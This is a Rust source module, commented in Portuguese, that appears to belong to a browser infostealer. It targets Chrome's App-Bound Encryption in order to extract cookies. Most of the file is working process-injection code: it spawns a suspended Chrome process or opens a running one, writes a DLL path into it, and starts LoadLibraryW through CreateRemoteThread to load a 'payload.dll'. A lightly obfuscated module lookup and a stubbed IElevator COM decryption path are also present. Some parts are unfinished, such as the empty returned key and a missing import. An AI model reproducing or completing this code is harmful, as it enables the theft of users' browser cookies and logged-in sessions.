// injection.rs - Versão COMPLETA para Chrome 127+ (ABE Bypass)
use std::ptr;
use std::mem;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::{
    shared::minwindef::{DWORD, FALSE, TRUE},
    um::{
        handleapi::CloseHandle,
        processthreadsapi::{
            OpenProcess, CreateRemoteThread, GetCurrentProcess,
            ResumeThread, GetExitCodeThread, CreateProcessW,
            PROCESS_INFORMATION, STARTUPINFOW,
        },
        memoryapi::{VirtualAllocEx, WriteProcessMemory, ReadProcessMemory},
        winnt::{
            PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, MEM_COMMIT, 
            PAGE_READWRITE, PAGE_EXECUTE_READ, CREATE_SUSPENDED,
        },
        tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS},
        errhandlingapi::GetLastError,
        libloaderapi::GetModuleHandleW,
        winbase::INFINITE,
        synchapi::WaitForSingleObject,
    },
};

#[derive(Debug)]
pub struct ChromeKey {
    pub key: Vec<u8>,
    pub success: bool,
}

// ============================================================
// MÉTODO 1: INJEÇÃO DE DLL EM PROCESSO SUSPENSO (MAIS EFICAZ)
// ============================================================
pub fn inject_into_suspended_chrome(dll_path: &str) -> Result<Vec<u8>, String> {
    println!("[INJECT] Creating suspended Chrome process...");
    
    // Caminho do Chrome
    let chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe";
    
    // Flags para criar processo suspenso
    let mut startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
    let mut proc_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    let chrome_path_wide: Vec<u16> = OsStr::new(chrome_path)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    // Cria processo SUSPENSO
    let success = unsafe {
        CreateProcessW(
            chrome_path_wide.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut proc_info,
        )
    };
    
    if success == 0 {
        let err = unsafe { GetLastError() };
        return Err(format!("Failed to create suspended process: {}", err));
    }
    
    println!("[INJECT] Process created suspended (PID: {})", proc_info.dwProcessId);
    
    // Injeta a DLL
    inject_dll(proc_info.hProcess, dll_path)?;
    
    // Retoma o processo
    unsafe { ResumeThread(proc_info.hThread); }
    println!("[INJECT] Process resumed, DLL should be loaded");
    
    // Aguarda um pouco para a DLL fazer seu trabalho
    std::thread::sleep(std::time::Duration::from_secs(5));
    
    // Aqui você receberia a chave via pipe compartilhado
    // Por enquanto, retornamos vazio (você precisa implementar a comunicação)
    
    unsafe {
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    }
    
    Ok(vec![])
}

// ============================================================
// MÉTODO 2: INJEÇÃO EM PROCESSO EXISTENTE
// ============================================================
pub fn inject_into_existing_chrome(dll_path: &str) -> Result<Vec<u8>, String> {
    println!("[INJECT] Finding existing Chrome process...");
    
    let pid = find_chrome_process().ok_or("Chrome process not found")?;
    println!("[INJECT] Found Chrome PID: {}", pid);
    
    let h_process = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
    };
    
    if h_process.is_null() {
        return Err("Failed to open Chrome process".to_string());
    }
    
    inject_dll(h_process, dll_path)?;
    
    unsafe { CloseHandle(h_process); }
    
    Ok(vec![])
}

// ============================================================
// FUNÇÃO CORE: INJEÇÃO DE DLL
// ============================================================
fn inject_dll(h_process: *mut winapi::ctypes::c_void, dll_path: &str) -> Result<(), String> {
    println!("[INJECT] Injecting DLL: {}", dll_path);
    
    unsafe {
        // Aloca memória no processo alvo
        let dll_path_wide: Vec<u16> = OsStr::new(dll_path)
            .encode_wide()
            .chain(Some(0))
            .collect();
        let dll_size = dll_path_wide.len() * 2;
        
        let remote_mem = VirtualAllocEx(
            h_process,
            ptr::null_mut(),
            dll_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        );
        
        if remote_mem.is_null() {
            return Err("Failed to allocate memory in target".to_string());
        }
        
        // Escreve o caminho da DLL
        let bytes_written = WriteProcessMemory(
            h_process,
            remote_mem,
            dll_path_wide.as_ptr() as _,
            dll_size,
            ptr::null_mut(),
        );
        
        if bytes_written == 0 {
            return Err("Failed to write DLL path".to_string());
        }
        
        // Encontra LoadLibraryW
        let kernel32 = GetModuleHandleW(&[107u16, 101u16, 114u16, 110u16, 101u16, 108u16, 51u16, 50u16, 46u16, 100u16, 108u16, 108u16, 0u16].as_ptr());
        let load_lib = GetProcAddress(kernel32 as *mut _, "LoadLibraryW\0".as_ptr());
        
        // Cria thread remota
        let h_thread = CreateRemoteThread(
            h_process,
            ptr::null_mut(),
            0,
            Some(mem::transmute(load_lib)),
            remote_mem,
            0,
            ptr::null_mut(),
        );
        
        if h_thread.is_null() {
            return Err("Failed to create remote thread".to_string());
        }
        
        WaitForSingleObject(h_thread, INFINITE);
        
        let mut exit_code = 0;
        GetExitCodeThread(h_thread, &mut exit_code);
        
        CloseHandle(h_thread);
        
        if exit_code == 0 {
            return Err("LoadLibraryW failed in target process".to_string());
        }
        
        println!("[INJECT] DLL injected successfully!");
        Ok(())
    }
}

// ============================================================
// MÉTODO 3: EXTRAÇÃO VIA COM DIRECT (SEM INJEÇÃO)
// ============================================================
pub fn extract_key_via_com() -> Result<Vec<u8>, String> {
    println!("[COM] Attempting to extract key via IElevator COM interface...");
    
    // Esta é a técnica mais limpa, mas requer conhecimento profundo do COM
    // O Chrome expõe o serviço IElevator para processos confiáveis
    
    // TODO: Implementar chamada COM direta
    // CoCreateInstance(CLSID_Elevator, ...)
    // IElevator::DecryptData(app_bound_key, ...)
    
    Err("COM extraction not yet implemented (requires CLSID reverse engineering)".to_string())
}

// ============================================================
// UTILITÁRIOS
// ============================================================
fn find_chrome_process() -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot as isize == -1isize {
            return None;
        }
        
        let mut entry: winapi::um::tlhelp32::PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(snapshot, &mut entry) == TRUE {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile);
                if name.to_lowercase() == "chrome.exe" {
                    let pid = entry.th32ProcessID;
                    CloseHandle(snapshot);
                    return Some(pid);
                }
                if Process32NextW(snapshot, &mut entry) == FALSE {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        None
    }
}

// ============================================================
// FUNÇÃO PRINCIPAL QUE COORDENA TUDO
// ============================================================
pub fn extract_chrome_cookies_modern() -> Result<String, String> {
    println!("[MODERN] Attempting modern Chrome extraction...");
    
    // Estratégia 1: Tentativa COM (mais limpa)
    if let Ok(key) = extract_key_via_com() {
        println!("[MODERN] COM extraction successful!");
        return Ok(String::from("COM extraction worked"));
    }
    
    // Estratégia 2: Injeção em processo existente
    let dll_path = std::env::current_exe()
        .map_err(|_| "Failed to get exe path")?
        .parent()
        .ok_or("No parent dir")?
        .join("payload.dll")
        .to_str()
        .ok_or("Invalid path")?
        .to_string();
    
    if let Ok(key) = inject_into_existing_chrome(&dll_path) {
        println!("[MODERN] Injection into existing Chrome successful!");
        return Ok(format!("Key extracted: {} bytes", key.len()));
    }
    
    // Estratégia 3: Criar novo processo suspenso
    if let Ok(key) = inject_into_suspended_chrome(&dll_path) {
        println!("[MODERN] Suspended process injection successful!");
        return Ok(format!("Key extracted: {} bytes", key.len()));
    }
    
    Err("All extraction methods failed".to_string())
}